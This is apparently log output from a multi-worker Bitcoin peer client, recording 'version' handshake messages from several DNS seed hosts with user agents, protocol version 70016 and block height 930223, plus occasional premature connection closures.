# [Worker 1375] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2159] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 2159] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1850] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 1850] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3411] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3411] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 1710] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 1710] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2689] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 2689] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 2925] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 2925] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 154] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 154] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1778] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 1778] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3420] Connection closed: Socket closed prematurely while reading header
# [Worker 3419] Connection closed: Socket closed prematurely while reading header
# [Worker 3425] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3425] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 3424] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 3424] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 2875] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 2875] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# ...
# [Worker 5953] Connection closed: Socket closed prematurely while reading header
# [Worker 5964] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 5964] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 5955] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 5955] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 5956] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 5956] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 5527] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 5527] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5244] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 5244] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5920] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 5920] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 4793] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 4793] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3468] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 3468] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5969] Connection closed: Socket closed prematurely while reading header
# [Worker 4891] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 4891] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5165] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 5165] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 4826] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 4826] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5970] Connection closed: Socket closed prematurely while reading header
# [Worker 5967] Connection closed: Socket closed prematurely while reading header
# [Worker 5974] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 5974] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 5977] Connection closed: Socket closed prematurely while reading header
# [Worker 5984] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 5984] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 3238] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 3238] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 4980] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 4980] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5021] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 5021] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5299] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 5299] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5360] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 5360] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 4690] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 4690] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5473] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 5473] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5421] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 5421] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5840] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 5840] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1380] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 1380] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5528] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 5528] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 4353] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 4353] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5022] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 5022] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3442] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 3442] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 4779] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 4779] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5499] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 5499] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5973] Connection closed: Socket closed prematurely while reading header
# [Worker 4581] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 4581] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5274] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 5274] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 4654] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 4654] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 4520] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 4520] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3469] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 3469] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3524] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 3524] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5420] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 5420] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5201] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 5201] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5191] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 5191] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 4970] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 4970] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1387] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 1387] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5553] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 5553] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3572] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 3572] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 495] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 495] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5068] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 5068] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5986] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 5986] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 4378] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 4378] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5657] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 5657] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5143] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 5143] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3559] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 3559] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3174] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 3174] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3368] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 3368] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5069] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 5069] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5327] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 5327] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5982] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 5982] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 6006] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 6006] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 799] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 799] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 6003] Connection closed: Socket closed prematurely while reading header
# [Worker 3843] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 3843] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5671] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 5671] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 4112] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 4112] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 4174] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 4174] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5057] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 5057] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 4782] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 4782] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5431] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 5431] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 4990] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 4990] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1253] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 1253] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 1474] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 1474] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 6012] Connection closed: Socket closed prematurely while reading header
# [Worker 5334] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 5334] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 6029] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 6029] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
# [Worker 5593] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 5593] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 6024] Connection closed: Socket closed prematurely while reading header
# [Worker 5126] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 5126] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5607] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 5607] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 4683] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 4683] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5377] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 5377] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 6031] Received 'version' from seed.bitcoinstats.com (102 bytes)
# [Worker 6031] Version: 70016 | User-Agent: /Satoshi:25.0.0/ | Height: 930223
# [Worker 5721] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 5721] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 6010] Connection closed: Socket closed prematurely while reading header
# [Worker 6023] Connection closed: Socket closed prematurely while reading header
# [Worker 4053] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 4053] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 6034] Connection closed: Socket closed prematurely while reading header
# [Worker 4198] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 4198] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5565] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 5565] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5275] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 5275] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 4634] Received 'version' from seed.bitcoin.jonasschnelli.ch (117 bytes)
# [Worker 4634] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5198] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 5198] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5592] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 5592] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 4020] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 4020] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 4328] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 4328] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5595] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 5595] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 4685] Received 'version' from seed.btc.petertodd.org (117 bytes)
# [Worker 4685] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5333] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 5333] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 3349] Received 'version' from seed.bitcoin.sipa.be (117 bytes)
# [Worker 3349] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 5294] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 5294] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 4397] Received 'version' from dnsseed.bitcoin.dashjr.org (117 bytes)
# [Worker 4397] Version: 70016 | User-Agent: /Satoshi:29.2.0/Knots:20251110/ | Height: 930223
# [Worker 6043] Received 'version' from dnsseed.bluematt.me (102 bytes)
# [Worker 6043] Version: 70016 | User-Agent: /Satoshi:30.0.0/ | Height: 930223
